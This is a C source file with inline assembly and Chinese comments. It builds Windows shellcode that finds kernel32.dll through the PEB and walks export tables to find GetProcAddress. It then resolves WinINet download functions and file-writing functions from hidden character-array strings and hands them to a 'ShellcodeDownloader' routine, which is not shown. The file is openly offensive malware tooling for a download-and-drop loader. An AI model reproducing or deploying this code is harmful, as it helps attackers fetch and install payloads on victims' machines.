#include"header.h"
#include"api.h"


//标记shellcode的开始位置，用来进行shellcode编写前的前置操作和所用到函数的初始化

__declspec(naked) void ShellcodeStart()
{
	__asm
	{
		jmp ShellcodeEntry
	}
}

//获取系统中kernel32.dll基址的方法
__declspec(naked) DWORD getKernel32()
{
	__asm
	{
		mov eax, fs: [030h] ;
		test eax, eax;
		js finished;
		mov eax, [eax + 0ch];
		mov eax, [eax + 14h];
		mov eax, [eax];
		mov eax, [eax]
		mov eax, [eax + 10h]
		finished:
		ret
	}
}

//获取GetProcAddress函数地址
FARPROC getProcAddress(HMODULE hModuleBase)
{
	FARPROC pRet = NULL;
	PIMAGE_DOS_HEADER lpDosHeader;
	PIMAGE_NT_HEADERS32 lpNtHeaders;
	PIMAGE_EXPORT_DIRECTORY lpExports;
	PWORD lpwOrd;
	PDWORD lpdwFunName;
	PDWORD lpdwFunAddr;
	DWORD dwLoop;

	lpDosHeader = (PIMAGE_DOS_HEADER)hModuleBase;
	lpNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)hModuleBase + lpDosHeader->e_lfanew);
	if (!lpNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)
	{
		return pRet;
	}
	if (!lpNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
	{
		return pRet;
	}
	lpExports = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hModuleBase + (DWORD)lpNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	if (!lpExports->NumberOfNames)
	{
		return pRet;
	}
	lpdwFunName = (PDWORD)((DWORD)hModuleBase + (DWORD)lpExports->AddressOfNames);
	lpwOrd = (PWORD)((DWORD)hModuleBase + (DWORD)lpExports->AddressOfNameOrdinals);
	lpdwFunAddr = (PDWORD)((DWORD)hModuleBase + (DWORD)lpExports->AddressOfFunctions);
	for (dwLoop = 0; dwLoop <= lpExports->NumberOfNames - 1; dwLoop++)
	{
		char* pszFunction = (char*)(lpdwFunName[dwLoop] + (DWORD)hModuleBase);
		if (pszFunction[0] == 'G'
			&& pszFunction[1] == 'e'
			&& pszFunction[2] == 't'
			&& pszFunction[3] == 'P'
			&& pszFunction[4] == 'r'
			&& pszFunction[5] == 'o'
			&& pszFunction[6] == 'c'
			&& pszFunction[7] == 'A'
			&& pszFunction[8] == 'd'
			&& pszFunction[9] == 'd'
			&& pszFunction[10] == 'r'
			&& pszFunction[11] == 'e'
			&& pszFunction[12] == 's'
			&& pszFunction[13] == 's')
		{
			pRet = (FARPROC)(lpdwFunAddr[lpwOrd[dwLoop]] + (DWORD)hModuleBase);
			break;
		}
	}
	return pRet;
}


void InitFunctions(PFUNCTIONS pFn)
{
	char szMsvcrt[] = { 'm','s','v','c','r','t','.','d','l','l',0 };
	char szWininet[] = { 'w','i','n','i','n','e','t','.','d','l','l',0 };

	//获取LoadLibraryA函数的地址
	pFn->fn_GetProcAddress = (FN_GetProcAddress)getProcAddress((HMODULE)getKernel32());

	char szLoadLibraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
	pFn->fn_LoadLibraryA = (FN_LoadLibraryA)pFn->fn_GetProcAddress((HMODULE)getKernel32(), szLoadLibraryA);

	//使用LoadLibrary函数载入wininet.dll，然后在里面搜寻 InternetOpenA 函数的地址
	char szInternetOpenA[] = { 'I','n','t','e','r','n','e','t','O','p','e','n','A',0 };
	pFn->fn_InternetOpenA = (FN_InternetOpenA)pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szWininet), szInternetOpenA);

	char szInternetOpenUrlA[] = { 'I','n','t','e','r','n','e','t','O','p','e','n','U','r','l','A',0 };
	pFn->fn_InternetOpenUrlA = (FN_InternetOpenUrlA)pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szWininet), szInternetOpenUrlA);

	//使用LoadLibrary函数载入msvcrt.dll，然后在里面搜寻 fopen_s 函数的地址
	char szFopenS[] = { 'f','o','p','e','n','_','s',0 };
	pFn->fn_fopen_s = (FN_fopen_s)pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szMsvcrt), szFopenS);

	char szInternetCloseHandle[] = { 'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d', 'l','e',0 };
	pFn->fn_InternetCloseHandle = (FN_InternetCloseHandle)pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szWininet), szInternetCloseHandle);

	char szInternetReadFile[] = {'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e',0};
	pFn->fn_InternetReadFile = (FN_InternetReadFile)pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szWininet), szInternetReadFile);

	//使用LoadLibrary函数载入msvcrt.dll，然后在里面搜寻 fwrite 函数的地址
	char szFwrite[] = { 'f','w','r','i','t','e',0 };
	pFn->fn_fwrite = (FN_fwrite)pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szMsvcrt), szFwrite);

	char szMalloc[] = { 'm','a','l','l','o','c',0 };
	pFn->fn_malloc = (FN_malloc)pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szMsvcrt), szMalloc);

	char szMemset[] = { 'm','e','m','s','e','t',0 };
	pFn->fn_memset = (FN_memset)pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szMsvcrt), szMemset);
	
	char szFree[] = { 'f','r','e','e',0 };
	pFn->fn_free = (FN_free)pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szMsvcrt), szFree);

	char szFclose[] = { 'f','c','l','o','s','e',0 };
	pFn->fn_fclose = (FN_fclose)pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szMsvcrt), szFclose);
}

void ShellcodeEntry()
{
	FUNCTIONS fn;
	InitFunctions(&fn);
	ShellcodeDownloader(&fn);
}